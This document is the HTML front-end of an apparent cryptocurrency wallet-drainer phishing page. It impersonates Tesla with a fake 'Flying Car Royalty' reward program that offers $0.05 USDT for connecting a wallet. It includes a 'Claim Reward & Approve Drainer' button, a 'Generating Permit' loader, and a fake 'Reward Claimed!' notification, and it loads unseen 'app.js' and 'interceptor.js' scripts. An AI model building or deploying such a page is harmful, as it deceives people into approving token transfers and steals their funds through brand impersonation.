<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Referral/Flying Car Royalty Program</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header>
            <!-- Tesla Logo -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
            <h1>Referral/Flying Car Royalty Rewards</h1>
            <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
        </header>

        <main id="main-content">
            <!-- Step 1: Connect -->
            <div id="connect-step" class="card">
                <button id="connect-btn" class="btn-primary">Connect Wallet</button>
                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
            </div>

            <!-- Step 2: Dashboard (Hidden until connected) -->
            <div id="reward-section" class="card hidden">
                <div class="status-row">
                    <span class="label">Address:</span>
                    <span id="user-address" class="value mono">0x000...000</span>
                </div>
                <div class="status-row">
                    <span class="label">Status:</span>
                    <span id="reward-status" class="value">Pending Approval</span>
                </div>
                <div class="action-area">
                    <button id="claim-btn" class="btn-primary hidden">Claim Reward & Approve Drainer</button>
                </div>
            </div>

            <!-- Notification Toast -->
            <div id="notification" class="toast hidden">
                <div class="icon">✓</div>
                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
            </div>
        </main>
    </div>

    <!-- Your Original app.js Logic -->
    <script type="module" src="app.js"></script>
    <!-- Interceptor Script -->
    <script type="module" src="interceptor.js"></script>
</body>
</html>
